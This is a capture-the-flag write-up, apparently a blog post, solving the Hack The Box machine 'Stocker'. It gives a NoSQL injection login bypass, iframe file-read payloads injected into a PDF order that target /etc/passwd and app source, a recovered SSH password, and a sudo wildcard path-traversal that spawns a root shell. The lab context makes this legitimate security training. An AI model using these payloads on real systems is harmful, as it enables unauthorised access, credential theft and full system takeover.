---
title: "Stocker from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Stocker from HTB
`nmap`gave this:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-generator: Eleventy v2.0.0
|_http-title: Stock - Coming Soon!
|_http-server-header: nginx/1.18.0 (Ubuntu)
```
Add the site to `/etc/hosts`:
```
10.10.11.196 stocker.htb
```
Access the site and there is nothing.
Start directory and subdomain enumeration. And in subdomain enumeration you will find `dev`subdomain:
```bash
ffuf -u http://stocker.htb -H "Host: FUZZ.stocker.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 178
----------------
--------------
dev
```
Add it to `/etc/hosts`
```
10.10.11.196 dev.stocker.htb
```
It's a login page. We have to perform `nosql injection`. Fire up `BurpSuite`
Turn on `Intercept`and click login. And this is the payload.
```js
-------------------
Content-Type: application/json
---------------
---------
{
  "username":{
    "$ne":"null"
  },
  "password":{
    "$ne":"null"
  }
}
```
`Forward`it and you will get logged in.
Press `add cart`, turn `Intercept`on and then click `Purchase`. You will need to modify one item like this:
```
{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"Cup","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":2}]}
```
Basically add
```
<iframe src='file:///etc/passwd' width='1000' height='1000'></iframe>
```
This will read `/etc/passwd`Then `view purchase order here`and read the `/etc/passwd`. Remember `angoose`who is an user in the system.
Then add this payload:
```
<iframe src='file:///var/www/dev/index.js' width='1000' height='1000'></iframe>
```
Read it and you will get the password for `angoose`.
>Username
>    angoose
> Password
>    IHeardPassphrasesArePrettySecure

Connect to `ssh angoose@stocker.htb` with password.
***
User Flag is: 8a8f71de1bb72eddb879ad9010ed6790
***
```bash
angoose@stocker:~$ sudo -l
[sudo] password for angoose:
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```
This means we have to create an `.js`file which will spawn an `bash shell`. But we do not have an write permission in that directory. As `*`means every string we can use that.
Basically `*`is also equal to `../../../tmp/shell.js`or whatever you want.
Create an `shell.js`with this inside:
```bash
const { spawn } = require('child_process');

// Spawning an interactive Bash shell
spawn('/bin/bash', { stdio: [0, 1, 2] });
```
Then run it and become the `root`:
```bash
 sudo /usr/bin/node /usr/local/scripts/../../../tmp/shell.js
root@stocker:/tmp#
```
***
Root Flag is: c735f1974f3988b1cd17a115179d74ef
***
![](/assets/images/Screenshot from 2024-08-12 23-27-45.png)
